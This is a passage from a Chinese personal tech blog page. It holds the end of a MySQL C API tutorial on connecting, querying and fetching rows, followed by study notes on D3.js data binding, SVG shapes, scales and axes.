<pre><code>$ gcc <span class="property">version</span>.c -o <span class="property">version</span>  `mysql_config <span class="comment">--cflags --libs`</span>
</code></pre><p>基本步骤是先初始化连接：</p>
<pre><code>MYSQL *con = mysql_init(<span class="literal">NULL</span>);

<span class="keyword">if</span> (con == <span class="literal">NULL</span>) 
{
    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, mysql_error(con));
    <span class="built_in">exit</span>(<span class="number">1</span>);
}
</code></pre><p>再真的连到服务器或某个数据库中：</p>
<pre><code><span class="keyword">if</span> (mysql_real_connect(con, <span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root_pswd"</span>, 
        <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>) == <span class="literal">NULL</span>) 
{
    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, mysql_error(con));
    mysql_close(con);
    <span class="built_in">exit</span>(<span class="number">1</span>);
}
</code></pre><p>执行操作：</p>
<pre><code><span class="keyword">if</span> (mysql_query(con, <span class="string">"CREATE DATABASE testdb"</span>)) 
{
    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, mysql_error(con));
    mysql_close(con);
    <span class="built_in">exit</span>(<span class="number">1</span>);
}
</code></pre><p>取回数据：</p>
<pre><code><span class="type">MYSQL_RES</span> *<span class="literal">result</span> = mysql_store_result(con);

<span class="keyword">if</span> (<span class="literal">result</span> == <span class="type">NULL</span>) 
{
    finish_with_error(con);
}

<span class="type">int</span> num_fields = mysql_num_fields(<span class="literal">result</span>);

<span class="type">MYSQL_ROW</span> row;

<span class="keyword">while</span> ((row = mysql_fetch_row(<span class="literal">result</span>))) 
{ 
    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_fields; i++) 
    { 
        printf(<span class="string">"%s "</span>, row[i] ? row[i] : <span class="string">"NULL"</span>); 
    } 
        printf(<span class="string">"\n"</span>); 
}

mysql_free_result(<span class="literal">result</span>);
</code></pre><p>还有些其它函数，参考<a href="http://dev.mysql.com/doc/refman/5.1/zh/apis.html" target="_blank" rel="external">http://dev.mysql.com/doc/refman/5.1/zh/apis.html</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/javascript/2014/05/18/a-glance-at-d3js/" itemprop="url">
                  A Glance at D3.js
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-05-18T00:00:00+08:00" content="2014-05-18">
              2014-05-18
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/javascript/" itemprop="url" rel="index">
                    <span itemprop="name">javascript</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/javascript/2014/05/18/a-glance-at-d3js/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="javascript/2014/05/18/a-glance-at-d3js/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>这几天，嗯，跟着<a href="https://www.dashingd3js.com/" target="_blank" rel="external">Dashing D3.js</a>把传说中的D3.js入了个门。</p>
<p>D3在创建基于浏览器的动态数据可视化并带交互真是方便。</p>
<h2 id="从一无所知到数据绑定">从一无所知到数据绑定</h2><h3 id="为何数据可视化">为何数据可视化</h3><ul>
<li>一图胜千言，图形是直观的。</li>
<li>图形是简洁明了的表达方式</li>
<li>世界的数据量是巨大的，图形是好的分析和展示方式</li>
<li>数据是新的石油</li>
</ul>
<h3 id="为何选择D3-js">为何选择D3.js</h3><ul>
<li>D3.js 是基于数据操作文档的JavaScript库。D3帮助你使用HTML，SVG和CSS生动地展现数据。D3不需要你使用某个特定的框架，它的重点在于对主流浏览器的兼容，同时结合了强大的虚拟化组件，以数据驱动的方式去操作DOM。</li>
<li>D3.js由Mike Bostock基于他在斯坦福可视化小组的工作开发，现由其所在的纽约时报赞助。很多贡献者参与到项目的开发，你可以在github上找到这个项目。</li>
<li>D3.js是指Data Driven Documents。当你的网页想要和数据进行交互时，D3是个好的选择。</li>
<li>D3.js被应用到web应用的前端，即用户交互部分。</li>
</ul>
<h3 id="数据可视化流程">数据可视化流程</h3><p>Ben Fry数据可视化流程：</p>
<ul>
<li>获取</li>
<li>解析</li>
<li>过滤</li>
<li>挖掘</li>
<li>呈现</li>
<li>提炼</li>
<li>交互</li>
</ul>
<h3 id="基本构建模块">基本构建模块</h3><ul>
<li>现代浏览器</li>
<li>HTML</li>
<li>CSS</li>
<li>Javascript</li>
<li>DOM</li>
<li>SVG</li>
<li>Web Inspector</li>
</ul>
<h3 id="D3第一步">D3第一步</h3><ul>
<li>在HTML文件中引用云端或本地js库</li>
<li>在Web Inspector控制台中测试</li>
</ul>
<h3 id="添加DOM元素">添加DOM元素</h3><ul>
<li><code>select</code></li>
<li><code>append</code></li>
</ul>
<h3 id="添加SVG元素">添加SVG元素</h3><ul>
<li>js的分行特性</li>
<li><code>style</code>操作符</li>
<li>链式语法</li>
<li><code>select</code>可以被保存赋值</li>
</ul>
<h3 id="将数据绑定到DOM元素上">将数据绑定到DOM元素上</h3><ul>
<li><code>selectAll</code></li>
<li><code>data</code>操作符</li>
<li>虚选择–<a href="http://bost.ocks.org/mike/join/" target="_blank" rel="external">Thinking with Joins</a></li>
<li><code>enter</code>/<code>exit</code>/update</li>
<li>对虚选择的<code>append</code></li>
<li><code>text</code>操作符</li>
<li>数据在<code>__data__</code>属性中</li>
</ul>
<h3 id="使用在DOM元素中的数据">使用在DOM元素中的数据</h3><ul>
<li>向D3.js操作符参数传递函数，</li>
<li>函数第一个参数是<code>__data__</code>内容。</li>
</ul>
<h2 id="使用数据来可视化">使用数据来可视化</h2><h3 id="基于数据创建SVG元素">基于数据创建SVG元素</h3><ul>
<li>创建SVG容器</li>
<li>创建形状元素，比如<code>circle</code></li>
<li>将数据绑定到形状元素(基本靠虚选择完成)</li>
<li>使用<code>style</code>利用数据修饰SVG元素</li>
</ul>
<h3 id="使用SVG坐标空间">使用SVG坐标空间</h3><ul>
<li><p>一图胜千言：</p>
<p>  ———————-&gt; x<br>  | o<br>  |<br>  |<br>  |<br>  |<br>  |<br>  |<br>  |<br>  |<br>  v y</p>
</li>
<li><p><code>append(&#39;svg&#39;)</code>作为坐标空间</p>
</li>
<li>在SVG坐标空间内放置SVG元素。<code>attr</code></li>
<li>创建SVG元素放置SVG元素</li>
<li>将数据绑定到SVG元素上</li>
<li>利用绑定的数据改变SVG元素的位置</li>
<li>使用绑定的数据修饰SVG元素</li>
</ul>
<h3 id="D3-js接受的数据结构">D3.js接受的数据结构</h3><ul>
<li><code>select</code>到的是数组</li>
<li>D3可以加载外部资源，好多种类</li>
<li>JSON(key一定是字符串)</li>
<li>JSON数组</li>
</ul>
<h3 id="使用D3-js简化代码">使用D3.js简化代码</h3><ul>
<li>将JSON对象绑定到<code>__data__</code>属性上</li>
<li>使用绑定的JSON对象变更SVG元素</li>
</ul>
<h3 id="SVG基本形和D3-js">SVG基本形和D3.js</h3><p>流程固定，设置svg容器，绑定数据，append形状元素，设置必要属性和样式。</p>
<ul>
<li>circle</li>
<li>rect</li>
<li>ellipse</li>
<li>line</li>
<li>polyline/polygon</li>
</ul>
<h3 id="SVG_Path和D3-js">SVG Path和D3.js</h3><ul>
<li>一个用来画画的SVG内置语言</li>
<li>使用D3.js生成形状元素绘制程序(D3.js Path 数据生成器)</li>
</ul>
<h3 id="动态SVG坐标空间">动态SVG坐标空间</h3><p>论如何通过遍历所有数据找到图像边界。</p>
<h3 id="D3-js缩放">D3.js缩放</h3><p>将某个Domain映射到一个Range上的对象/类/函数。</p>
<ul>
<li><code>d3.scale.linear.domain([1,100]).range([0,1])</code></li>
<li><code>d3.max</code></li>
<li><code>d3.min</code></li>
<li>还有些其它量化的和非量化的缩放。</li>
</ul>
<h3 id="SVG_Group元素和D3-js">SVG Group元素和D3.js</h3><ul>
<li>可嵌套的<code>&lt;g&gt;</code>用来分组</li>
<li><code>transform</code>属性和从右到左执行各种tranforming(matrix/translate/scale/skewX/skewY)</li>
<li>transform的转换是相对空间坐标的转换</li>
<li>使用D3.js来分组SVG元素(<code>append</code>)</li>
<li>使用D3.js来转换SVG元素(<code>attr</code>)</li>
</ul>
<h3 id="SVG_Text_元素">SVG Text 元素</h3><ul>
<li><code>text</code>标签及属性, 比如<code>text-anchor</code>属性</li>
<li>使用D3.js创建Text元素，绑定数据，使用数据。</li>
</ul>
<h3 id="SVG坐标轴元素">SVG坐标轴元素</h3><ul>
<li>D3的坐标轴组件，包括水平与竖直坐标轴线、刻度、合适的分隔空间等等。</li>
<li>坐标轴可以更清晰展现变量大小和关系</li>
<li>坐标轴的范围，是否反转、类型、单位等</li>
<li>生成D3.js坐标轴函数(<code>d3.svg.axis().scale($SCALE)</code>)</li>
<li>调用坐标轴函数(<code>var xAxisGroup = svgContainer.append(&quot;g&quot;).call($FUNCTION);</code>)生成坐标轴元素组。</li>
<li>最后创建坐标轴(最上层)</li>
</ul>
<p>然后忽然没了？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p>
<p>准备继续看<a href="http://alignedleft.com/tutorials/d3/" target="_blank" rel="external">Scott Murray的D3.js教程</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    

  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right"></i></a>
  </nav>



        </div>

        


        

      </div>

      
        
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Liu Yuyang" itemprop="image"/>
          <p class="site-author-name" itemprop="name">Liu Yuyang</p>
        </div>
        <p class="site-description motion-element" itemprop="description">我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">167</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            
              <span class="site-state-item-count">23</span>
              <span class="site-state-item-name">分类</span>
              
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">57</span>
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/reverland" target="_blank">
                  
                    <i class="fa fa-github"></i> GitHub
                  
                </a>
              </span>
            
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
        </div>

      </section>

      

    </div>
  </aside>


      
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2011 - 
  <span itemprop="copyrightYear">2015</span>
  <span class="with-love">
    <i class="icon-next-heart fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Liu Yuyang</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT
  </a>
</div>



      </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  

  
    
    

  

    <script type="text/javascript">
      var disqus_shortname = 'reverlandblog';
      var disqus_identifier = 'page/5/index.html';
      var disqus_title = '';
      var disqus_url = '';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
    </script>
  


  

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>


  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  

  <script type="text/javascript" src="/js/bootstrap.js"></script>

  
  

  
  

</body>
</html>
